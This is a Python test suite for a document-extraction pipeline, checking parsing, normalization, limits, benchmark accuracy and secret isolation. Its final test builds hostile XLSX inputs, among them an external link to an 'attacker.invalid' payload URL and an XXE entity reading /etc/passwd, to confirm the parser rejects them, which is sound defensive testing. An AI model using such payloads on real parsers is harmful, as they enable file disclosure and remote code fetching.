import json
import subprocess
from pathlib import Path
from types import SimpleNamespace

import pytest

from app.intelligence.benchmark import evaluate, flatten
from app.intelligence.execution import execute
from app.intelligence.extraction import extract
from app.intelligence.normalization import normalize
from app.intelligence.parsing import parse
from app.intelligence.schema import Limits, ProcessingError, Proposal
from tests.intelligence_fixtures import fixture_bytes, pdf_bytes, xlsx_bytes

CASES = json.loads(
    (Path(__file__).parent / "fixtures/document_intelligence/golden.json").read_text()
)


@pytest.mark.parametrize("case", CASES, ids=lambda case: case["name"])
def test_golden_extraction_and_independent_evidence(case, tmp_path):
    data, mime = fixture_bytes(case)
    file = tmp_path / "source"
    file.write_bytes(data)
    parsed = parse(file, mime, Limits())
    result = extract(parsed, case["document_type"], Limits())
    values = flatten(result.structured)
    assert result.status == case["status"]
    for path, truth in case["expected"].items():
        assert values.get(path) == truth, path
    collection = "lines" if case["document_type"] == "invoice" else "pricing"
    assert len(result.structured[collection]) == case["count"]
    for fact in result.fields:
        assert fact.raw_value
        if case["format"] == "pdf":
            assert fact.source["page"] == 1
            if "text" in fact.source:
                assert fact.raw_value in fact.source["text"]
        else:
            row, column = fact.source["row"], fact.source["column"]
            assert case["rows"][row - 1][column - 1] == fact.raw_value
            if case["format"] == "xlsx":
                assert fact.source["sheet"] == "Synthetic"
                assert fact.source["cell"].endswith(str(row))
    evidenced = {fact.path for fact in result.fields}
    assert all(value is None for key, value in values.items() if key not in evidenced)


def test_benchmark_is_exact_and_has_no_false_fabrication():
    report = evaluate(CASES, fixture_bytes)
    assert report["failures"] == []
    assert report["missing_fabricated"] == 0
    assert report["required_correct"] == report["required_total"] == 73
    assert report["evidence_correct"] == report["evidence_total"] == 128


@pytest.mark.parametrize(
    ("raw", "kind", "expected"),
    [
        ("USD 1,250.00", "decimal", "1250.00"),
        ("eight percent (8%)", "decimal", "8"),
        ("nine percent (8%)", "decimal", None),
        ("0.000001", "decimal", "0.000001"),
        ("0.0000001", "decimal", None),
        ("100000000000000", "decimal", None),
        ("NaN", "decimal", None),
        ("Infinity", "decimal", None),
        ("1e5", "decimal", None),
        ("$ 18.40", "decimal", None),
        ("1,250", "decimal", None),
        ("1.250,00", "decimal", None),
        ("03/04/2026", "date", None),
        ("2026-02-30", "date", None),
        ("2026-03-04", "date", "2026-03-04"),
        ("March 4, 2026", "date", "2026-03-04"),
        ("$", "currency", None),
        ("usd", "currency", "USD"),
        ("MAD", "currency", "MAD"),
        ("XYZ", "currency", None),
        ("yes", "boolean", True),
        ("perhaps", "boolean", None),
        ("  INV-7 ", "text", "INV-7"),
        ("", "text", None),
    ],
)
def test_conservative_normalization(raw, kind, expected):
    assert normalize(raw, kind) == expected


@pytest.mark.parametrize(
    ("data", "mime", "code"),
    [
        (b"%PDF-1.4 corrupt", "application/pdf", "corrupt_document"),
        (pdf_bytes("Supplier: Synthetic", encrypted=True), "application/pdf", "encrypted_pdf"),
        (pdf_bytes(), "application/pdf", "empty_document"),
        (b'field,value\n"unterminated', "text/csv", "corrupt_document"),
        (b"field,value\n", "text/csv", "empty_document"),
        (b"a,a\n1,2", "text/csv", "unsupported_structure"),
        (b"a,b\n1,2,3", "text/csv", "unsupported_structure"),
        (b"a,b\n\xff,2", "text/csv", "corrupt_document"),
        (
            b"not a zip",
            "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            "corrupt_document",
        ),
    ],
)
def test_malformed_and_empty_files_fail_safely(data, mime, code, tmp_path):
    file = tmp_path / "input"
    file.write_bytes(data)
    with pytest.raises(ProcessingError) as caught:
        parse(file, mime, Limits())
    assert caught.value.code == code


@pytest.mark.parametrize("kind", ["pages", "rows", "cells", "characters", "zip"])
def test_processing_limits(kind, tmp_path):
    limits = Limits(max_pages=1, max_rows=1, max_cells=1, max_characters=1024, max_zip_bytes=1024)
    data = (
        pdf_bytes("Supplier: Synthetic", pages=2)
        if kind == "pages"
        else (
            xlsx_bytes([["field", "value"], ["supplier", "x" * 2000]])
            if kind == "zip"
            else b"field,value\nsupplier,Synthetic\ncustomer,Example"
            if kind in {"rows", "cells"}
            else b"field,value\nsupplier," + b"x" * 2000
        )
    )
    mime = (
        "application/pdf"
        if kind == "pages"
        else "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
        if kind == "zip"
        else "text/csv"
    )
    file = tmp_path / "source"
    file.write_bytes(data)
    with pytest.raises(ProcessingError, match="processing_limit"):
        parse(file, mime, limits)


def test_formulas_are_not_evaluated_or_trusted(tmp_path):
    file = tmp_path / "formula.xlsx"
    file.write_bytes(
        xlsx_bytes([["field", "value"], ["total", "999"], ["supplier", "Synthetic"]], formula=True)
    )
    parsed = parse(
        file, "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", Limits()
    )
    result = extract(parsed, "invoice", Limits())
    assert result.structured["totals"]["total"] is None
    assert "spreadsheet_formulas_ignored" in result.warnings
    assert all("999" not in source.raw for source in parsed.sources)


def test_conflicting_sources_remain_unknown(tmp_path):
    file = tmp_path / "source"
    file.write_text("field,value\nTotal,18.40\nTotal,19.00\n")
    result = extract(parse(file, "text/csv", Limits()), "invoice", Limits())
    assert result.structured["totals"]["total"] is None
    assert len([fact for fact in result.fields if fact.path == "totals.total"]) == 2
    assert all(fact.normalized_value is None and fact.confidence == "low" for fact in result.fields)


def test_invalid_provider_evidence_is_rejected(tmp_path):
    file = tmp_path / "source"
    file.write_text("field,value\nsupplier,Synthetic\n")

    class InvalidProvider:
        identifier = "test"
        version = "test"

        def propose(self, parsed, document_type):
            return [Proposal("totals.total", 999999)]

    with pytest.raises(ProcessingError, match="schema_validation"):
        extract(parse(file, "text/csv", Limits()), "invoice", Limits(), InvalidProvider())


def test_pdf_evidence_retains_actual_page_number(tmp_path):
    file = tmp_path / "source"
    file.write_bytes(pdf_bytes("Supplier: Synthetic", pages=3))
    result = extract(parse(file, "application/pdf", Limits()), "contract", Limits())
    assert [fact.source["page"] for fact in result.fields] == [1, 2, 3]


def test_mixed_scanned_document_requires_ocr(tmp_path):
    file = tmp_path / "source"
    file.write_bytes(pdf_bytes("Invoice number: I-1", scanned=True))
    result = extract(parse(file, "application/pdf", Limits()), "invoice", Limits())
    assert result.status == "needs_ocr"
    assert result.structured["identity"]["invoice_number"] == "I-1"


def test_scanned_image_inside_form_is_marked_for_ocr(tmp_path):
    import io

    from pypdf import PdfReader, PdfWriter
    from pypdf.generic import DecodedStreamObject, DictionaryObject, NameObject

    writer = PdfWriter()
    writer.append(PdfReader(io.BytesIO(pdf_bytes(scanned=True))))
    page = writer.pages[0]
    form = DecodedStreamObject()
    form.set_data(b"/Im1 Do")
    form.update(
        {
            NameObject("/Subtype"): NameObject("/Form"),
            NameObject("/Resources"): page["/Resources"],
        }
    )
    page[NameObject("/Resources")] = DictionaryObject(
        {NameObject("/XObject"): DictionaryObject({NameObject("/Fm1"): writer._add_object(form)})}
    )
    content = DecodedStreamObject()
    content.set_data(b"/Fm1 Do")
    page[NameObject("/Contents")] = writer._add_object(content)
    file = tmp_path / "nested-scan.pdf"
    writer.write(file)
    result = extract(parse(file, "application/pdf", Limits()), "invoice", Limits())
    assert result.status == "needs_ocr"
    assert result.fields == []


def test_recursive_pdf_form_resources_are_bounded():
    from pypdf.generic import DictionaryObject, NameObject

    from app.intelligence.parsing import has_pdf_images

    resources = DictionaryObject()
    form = DictionaryObject(
        {NameObject("/Subtype"): NameObject("/Form"), NameObject("/Resources"): resources}
    )
    resources[NameObject("/XObject")] = DictionaryObject({NameObject("/Fm1"): form})
    assert has_pdf_images(resources) is False


@pytest.mark.parametrize("name", ["fixed-price", "csv-invoice", "xlsx-invoice"])
def test_disposable_worker_and_integrity(name, tmp_path, monkeypatch):
    from tests.parser_environment import require_confinement

    require_confinement()
    import hashlib

    from app.domain.types import DocumentType
    from app.modules.storage import LocalObjectStorage

    case = next(case for case in CASES if case["name"] == name)
    data, mime = fixture_bytes(case)
    storage = LocalObjectStorage(tmp_path / "storage")
    import io

    stored = storage.put("synthetic/source", io.BytesIO(data), max_bytes=100000)
    document = SimpleNamespace(
        storage_key=stored.key,
        sha256=hashlib.sha256(data).hexdigest(),
        file_size=len(data),
        mime_type=mime,
        document_type=DocumentType(case["document_type"]),
    )
    monkeypatch.setenv("OIDC_PRIVATE_SECRET", "never-forward-this")
    result = execute(storage, document, Limits(), 100000)
    assert result.status == "processed"
    assert "never-forward-this" not in result.model_dump_json()
    document.sha256 = "a" * 64
    with pytest.raises(ProcessingError, match="content_integrity"):
        execute(storage, document, Limits(), 100000)


def test_worker_timeout_kills_process_and_does_not_forward_secrets(tmp_path, monkeypatch):
    import io

    from app.domain.types import DocumentType
    from app.modules.storage import LocalObjectStorage

    storage = LocalObjectStorage(tmp_path)
    stored = storage.put("source", io.BytesIO(b"field,value\nsupplier,Synthetic"), max_bytes=1024)
    document = SimpleNamespace(
        storage_key=stored.key,
        sha256=stored.sha256,
        file_size=stored.file_size,
        mime_type="text/csv",
        document_type=DocumentType.INVOICE,
    )
    seen = {}

    class SlowProcess:
        def __init__(self, *args, **kwargs):
            seen.update(kwargs)

        def communicate(self, *args, **kwargs):
            raise subprocess.TimeoutExpired("synthetic", 1)

        def kill(self):
            seen["killed"] = True

        def wait(self):
            seen["waited"] = True

    monkeypatch.setenv("PRIVATE_SECRET", "sensitive")
    monkeypatch.setattr("app.intelligence.execution.subprocess.Popen", SlowProcess)
    with pytest.raises(ProcessingError, match="processing_timeout"):
        execute(storage, document, Limits(timeout_seconds=1), 1024)
    assert seen["killed"] and seen["waited"]
    assert "PRIVATE_SECRET" not in seen["env"]
    assert not Path(seen["stdout"].name).exists()


def test_unavailable_payment_schedule_stays_unknown(tmp_path):
    file = tmp_path / "source"
    file.write_text("field,value\npayment terms,pursuant to the unavailable standard schedule\n")
    result = extract(parse(file, "text/csv", Limits()), "contract", Limits())
    assert result.structured["payment"]["terms"] is None
    assert result.fields[0].raw_value == "pursuant to the unavailable standard schedule"
    assert result.status == "needs_review"


def test_sparse_line_numbers_do_not_invent_line_items(tmp_path):
    file = tmp_path / "source"
    file.write_text("field,value\nline 5000 description,Synthetic\n")
    with pytest.raises(ProcessingError, match="unsupported_structure"):
        extract(parse(file, "text/csv", Limits()), "invoice", Limits())


def test_field_limit_is_enforced(tmp_path):
    file = tmp_path / "source"
    file.write_text("field,value\nsupplier,Synthetic\ninvoice number,I-1\n")
    with pytest.raises(ProcessingError, match="processing_limit"):
        extract(parse(file, "text/csv", Limits()), "invoice", Limits(max_fields=1))


@pytest.mark.parametrize("mutation", ["amount", "date", "fabrication", "evidence"])
def test_benchmark_detects_wrong_values_and_source_locations(monkeypatch, mutation):
    import copy

    import app.intelligence.benchmark as benchmark

    original = benchmark.extract

    def corrupted(*args, **kwargs):
        result = copy.deepcopy(original(*args, **kwargs))
        if mutation == "amount":
            result.structured["totals"]["total"] = "999.00"
        elif mutation == "date":
            result.structured["dates"]["invoice_date"] = "2026-04-03"
        elif mutation == "fabrication":
            result.structured["dates"]["due_date"] = "2026-04-04"
        else:
            result.fields[0].source["page"] = 999
        return result

    monkeypatch.setattr(benchmark, "extract", corrupted)
    case = next(case for case in CASES if case["name"] == "one-line-invoice")
    report = benchmark.evaluate([case], fixture_bytes)
    assert report["missing_fabricated"] if mutation == "fabrication" else report["failures"]


@pytest.mark.parametrize("modification", ["external", "xxe", "macro", "duplicate"])
def test_untrusted_spreadsheet_structures_are_rejected(tmp_path, modification):
    import io
    import zipfile

    data = xlsx_bytes([["field", "value"], ["supplier", "Synthetic"]])
    with zipfile.ZipFile(io.BytesIO(data)) as original:
        entries = {name: original.read(name) for name in original.namelist()}
    if modification == "external":
        key = "xl/_rels/workbook.xml.rels"
        entries[key] = entries[key].replace(
            b'Target="worksheets/sheet1.xml"',
            b'TargetMode="External" Target="https://attacker.invalid/payload"',
        )
    elif modification == "xxe":
        entries["xl/workbook.xml"] = (
            b'<!DOCTYPE workbook [<!ENTITY external SYSTEM "file:///etc/passwd">]><workbook>&external;</workbook>'
        )
    elif modification == "macro":
        entries["xl/vbaProject.bin"] = b"inert synthetic macro"
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w") as archive:
        for name, content in entries.items():
            archive.writestr(name, content)
        if modification == "duplicate":
            with pytest.warns(UserWarning):
                archive.writestr("xl/workbook.xml", entries["xl/workbook.xml"])
    file = tmp_path / "source"
    file.write_bytes(output.getvalue())
    with pytest.raises(ProcessingError):
        parse(file, "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", Limits())
